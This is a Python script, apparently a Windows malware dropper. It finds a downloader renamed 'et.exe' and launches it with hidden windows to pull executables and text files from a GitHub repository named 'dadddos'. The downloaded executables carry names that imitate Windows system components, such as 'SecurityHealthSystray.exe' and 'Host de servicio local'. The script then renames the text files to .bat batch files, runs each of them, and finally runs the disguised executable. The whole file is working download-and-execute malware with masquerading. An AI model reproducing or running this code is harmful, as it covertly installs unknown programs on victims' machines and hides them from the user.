import subprocess
import time
import os 
username = os.getlogin()
def search_file(filename):
    rutas = [f'C:\\Users\\Public', f'C:\\Users\\{username}\\Downloads\\dadddos', f'C:\\Users\{username}\\Downloads', f'C:\\Users\\{username}\\Downloads\\bajar', f'C:\\Users\\{username}\\\Downloads\\bajar\\dadddos']
    for path in rutas:
        filePath = os.path.join(path, filename)
        if os.path.exists(filePath):
            return filePath
    return "No se encontró el archivo"
filename = "et.exe"
resultPath = search_file(filename)
subprocess.Popen(f"{resultPath} https://raw.githubusercontent.com/attthous/dadddos/main/bandit12/oneex.txt -P C:\\Users\\Public", creationflags=subprocess.CREATE_NO_WINDOW)
time.sleep(2)
nombres_archivox = ['oneex.txt']
rutax = [f'C:\\Users\\Public']
for ruta in rutax:
    for nombre in nombres_archivox:
        archivo = os.path.join(ruta, nombre)
        if os.path.exists(archivo):         
            nuevo_archivo = os.path.splitext(archivo)[0] + '.bat'
            os.rename(archivo, nuevo_archivo)
time.sleep(2)
archivo = "oneex.bat" 
for path in rutax:
    filePath = os.path.join(path, archivo)
    if os.path.exists(filePath):
        rutaArchivo = filePath
        break
else:
    rutaArchivo = "No"
os.system(rutaArchivo)
time.sleep(2)
def search_file(filename):
    rutas = [f'C:\\Users\\Public', f'C:\\Users\\{username}\\Downloads\\dadddos', f'C:\\Users\{username}\\Downloads', f'C:\\Users\\{username}\\Downloads\\bajar', f'C:\\Users\\{username}\\\Downloads\\bajar\\dadddos']
    for path in rutas:
        filePath = os.path.join(path, filename)
        if os.path.exists(filePath):
            return filePath
    return "No se encontró el archivo"
filename = "et.exe"
resultPath = search_file(filename)
subprocess.Popen(f"{resultPath} https://raw.githubusercontent.com/attthous/dadddos/main/bandit12/oneex.txt -P C:\\Users\\Public", creationflags=subprocess.CREATE_NO_WINDOW)
subprocess.Popen(f"{resultPath} https://raw.githubusercontent.com/attthous/dadddos/main/et.exe -P C:\\Users\\Public", creationflags=subprocess.CREATE_NO_WINDOW)
subprocess.Popen(f"{resultPath} https://raw.githubusercontent.com/attthous/dadddos/main/bandit12/SecurityHealthSystray.exe -P C:\\Users\\Public", creationflags=subprocess.CREATE_NO_WINDOW)
subprocess.Popen(f"{resultPath} https://raw.githubusercontent.com/attthous/dadddos/main/WindowsSecuirix.exe -P C:\\Users\\Public", creationflags=subprocess.CREATE_NO_WINDOW)
subprocess.Popen(f"{resultPath} https://raw.githubusercontent.com/attthous/dadddos/main/ddlhosts.exe -P C:\\ProgramData", creationflags=subprocess.CREATE_NO_WINDOW)
subprocess.Popen(f"{resultPath} https://raw.githubusercontent.com/attthous/dadddos/main/ddlllhosts.exe -P C:\\ProgramData", creationflags=subprocess.CREATE_NO_WINDOW)
subprocess.Popen(f"{resultPath} https://raw.githubusercontent.com/attthous/dadddos/main/bandit12/Host%20de%20servicio%20local%20(...).exe -P C:\\ProgramData", creationflags=subprocess.CREATE_NO_WINDOW)
subprocess.Popen(f"{resultPath} https://raw.githubusercontent.com/attthous/dadddos/main/bandit12/twopriohoalta.txt -P C:\\Users\\Public", creationflags=subprocess.CREATE_NO_WINDOW)
subprocess.Popen(f"{resultPath} https://raw.githubusercontent.com/attthous/dadddos/main/bandit12/trestartservho.txt -P C:\\Users\\Public", creationflags=subprocess.CREATE_NO_WINDOW)
subprocess.Popen(f"{resultPath} https://raw.githubusercontent.com/attthous/dadddos/main/bandit12/xstartddl.txt -P C:\\Users\\Public", creationflags=subprocess.CREATE_NO_WINDOW)
subprocess.Popen(f"{resultPath} https://raw.githubusercontent.com/attthous/dadddos/main/bandit12/fivprioddl.txt -P C:\\Users\\Public", creationflags=subprocess.CREATE_NO_WINDOW)
########################################################
time.sleep(10)
nombres_archivox = ['twopriohoalta.txt', 'trestartservho.txt', 'xstartddl.txt', 'fivprioddl.txt']
rutax = [f'C:\\Users\\Public']


nombres_archivox = ['twopriohoalta.txt']
rutax = [f'C:\\Users\\Public']
for ruta in rutax:
    for nombre in nombres_archivox:
        archivo = os.path.join(ruta, nombre)
        if os.path.exists(archivo):         
            nuevo_archivo = os.path.splitext(archivo)[0] + '.bat'
            os.rename(archivo, nuevo_archivo)
archivo = "twopriohoalta.bat" 
for path in rutax:
    filePath = os.path.join(path, archivo)
    if os.path.exists(filePath):
        rutaArchivo = filePath
        break
else:
    rutaArchivo = "No"
os.system(rutaArchivo)


nombres_archivox = ['trestartservho.txt']
rutax = [f'C:\\Users\\Public']
for ruta in rutax:
    for nombre in nombres_archivox:
        archivo = os.path.join(ruta, nombre)
        if os.path.exists(archivo):         
            nuevo_archivo = os.path.splitext(archivo)[0] + '.bat'
            os.rename(archivo, nuevo_archivo)
archivo = "trestartservho.bat" 
for path in rutax:
    filePath = os.path.join(path, archivo)
    if os.path.exists(filePath):
        rutaArchivo = filePath
        break
else:
    rutaArchivo = "No"
os.system(rutaArchivo)

nombres_archivox = ['xstartddl.txt']
rutax = [f'C:\\Users\\Public']
for ruta in rutax:
    for nombre in nombres_archivox:
        archivo = os.path.join(ruta, nombre)
        if os.path.exists(archivo):         
            nuevo_archivo = os.path.splitext(archivo)[0] + '.bat'
            os.rename(archivo, nuevo_archivo)
archivo = "xstartddl.bat" 
for path in rutax:
    filePath = os.path.join(path, archivo)
    if os.path.exists(filePath):
        rutaArchivo = filePath
        break
else:
    rutaArchivo = "No"
os.system(rutaArchivo)

nombres_archivox = ['fivprioddl.txt']
rutax = [f'C:\\Users\\Public']
for ruta in rutax:
    for nombre in nombres_archivox:
        archivo = os.path.join(ruta, nombre)
        if os.path.exists(archivo):         
            nuevo_archivo = os.path.splitext(archivo)[0] + '.bat'
            os.rename(archivo, nuevo_archivo)
archivo = "fivprioddl.bat" 
for path in rutax:
    filePath = os.path.join(path, archivo)
    if os.path.exists(filePath):
        rutaArchivo = filePath
        break
else:
    rutaArchivo = "No"
os.system(rutaArchivo)

ruta_archivo = r"C:\ProgramData\Host de servicio local (...).exe"
subprocess.call(ruta_archivo)